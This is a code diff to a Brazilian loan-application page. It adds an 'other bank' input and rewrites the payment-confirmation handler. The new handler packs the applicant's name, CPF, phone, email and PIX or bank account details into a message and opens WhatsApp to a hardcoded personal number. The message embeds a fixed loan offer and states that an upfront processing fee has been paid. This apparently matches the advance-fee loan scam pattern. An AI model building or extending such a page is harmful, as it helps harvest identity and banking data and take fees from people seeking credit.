@@ -91,7 +91,6 @@
       </div>
     </nav>
 
-    <!-- Hero Section - Versão Limpa -->
     <!-- Hero Section - Versão Responsiva -->
     <section class="hero-section">
       <div class="container">
@@ -464,6 +463,27 @@
                         </div>
                       </div>
                     </div>
+
+                    <!-- Campo para digitar o nome do banco quando selecionar "Outro" -->
+                    <div class="row" id="other-bank-row" style="display: none">
+                      <div class="col-md-12 mb-3">
+                        <label for="other-bank-name" class="form-label"
+                          >Nome do Banco</label
+                        >
+                        <div class="input-group">
+                          <span class="input-group-text"
+                            ><i class="fas fa-university"></i
+                          ></span>
+                          <input
+                            type="text"
+                            class="form-control"
+                            id="other-bank-name"
+                            placeholder="Digite o nome do banco"
+                          />
+                        </div>
+                      </div>
+                    </div>
+
                     <div class="row">
                       <div class="col-md-4 mb-3">
                         <label for="agency" class="form-label">Agência</label>
@@ -1184,6 +1204,19 @@
         const methodBank = document.getElementById("method-bank");
         const pixOptionFields = document.getElementById("pix-option-fields");
         const bankOptionFields = document.getElementById("bank-option-fields");
+        const bankName = document.getElementById("bank-name");
+        const otherBankRow = document.getElementById("other-bank-row");
+
+        // Mostrar/ocultar campo para digitar nome do banco quando selecionar "Outro"
+        if (bankName) {
+          bankName.addEventListener("change", function () {
+            if (this.value === "other") {
+              otherBankRow.style.display = "flex";
+            } else {
+              otherBankRow.style.display = "none";
+            }
+          });
+        }
 
         // Alternar entre métodos de pagamento
         if (methodPix && methodBank) {
@@ -1296,12 +1329,21 @@
               const agency = document.getElementById("agency");
               const account = document.getElementById("account");
               const accountDigit = document.getElementById("account-digit");
+              const otherBankName = document.getElementById("other-bank-name");
 
               if (bankName.value === "") {
                 bankName.classList.add("is-invalid");
                 isValid = false;
               } else {
                 bankName.classList.remove("is-invalid");
+
+                // Validar campo de nome do banco quando "Outro" está selecionado
+                if (bankName.value === "other" && !otherBankName.value.trim()) {
+                  otherBankName.classList.add("is-invalid");
+                  isValid = false;
+                } else if (otherBankName) {
+                  otherBankName.classList.remove("is-invalid");
+                }
               }
 
               if (accountType.value === "") {
@@ -1396,14 +1438,57 @@
           });
         }
 
-        // Confirm payment
+        // Confirm payment - Enviar dados para WhatsApp
         if (confirmPayment) {
           confirmPayment.addEventListener("click", function (e) {
             e.preventDefault();
-            alert(
-              "Pagamento confirmado! Em breve analisaremos sua solicitação e entraremos em contato."
+
+            // Coletar todos os dados do formulário
+            const nome = document.getElementById("nome").value;
+            const cpf = document.getElementById("cpf").value;
+            const telefone = document.getElementById("telefone").value;
+            const email = document.getElementById("email").value;
+
+            // Verificar qual método de recebimento foi selecionado
+            let dadosBancarios = "";
+            if (methodPix.checked) {
+              const pixKey = document.getElementById("pix-key").value;
+              dadosBancarios = `Método: PIX\nChave PIX: ${pixKey}`;
+            } else {
+              const bankNameSelect = document.getElementById("bank-name");
+              let bankNameValue =
+                bankNameSelect.options[bankNameSelect.selectedIndex].text;
+
+              // Se for "Outro", pegar o valor digitado
+              if (bankNameSelect.value === "other") {
+                const otherBankName =
+                  document.getElementById("other-bank-name").value;
+                bankNameValue = otherBankName;
+              }
+
+              const accountType =
+                document.getElementById("account-type").value === "checking"
+                  ? "Conta Corrente"
+                  : "Conta Poupança";
+              const agency = document.getElementById("agency").value;
+              const account = document.getElementById("account").value;
+              const accountDigit =
+                document.getElementById("account-digit").value;
+
+              dadosBancarios = `Método: Conta Bancária\nBanco: ${bankNameValue}\nTipo de Conta: ${accountType}\nAgência: ${agency}\nConta: ${account}\nDígito: ${accountDigit}`;
+            }
+
+            // Montar a mensagem para o WhatsApp
+            const mensagem = `*Nova solicitação de empréstimo*\n\n*Dados Pessoais:*\nNome: ${nome}\nCPF: ${cpf}\nTelefone: ${telefone}\nE-mail: ${email}\n\n*Dados Bancários:*\n${dadosBancarios}\n\n*Proposta:*\nValor liberado: R$ 2.732,80\nParcela: R$ 70,00 x 48\nTaxa de serviço: R$ 49,90\n\n*Pagamento da taxa de processamento realizado.*`;
+
+            // Codificar a mensagem para URL
+            const mensagemCodificada = encodeURIComponent(mensagem);
+
+            // Abrir o WhatsApp com a mensagem
+            window.open(
+              `https://wa.me/556993238278?text=${mensagemCodificada}`,
+              "_blank"
             );
-            // Here you would normally redirect to a thank you page or next step
           });
         }
 
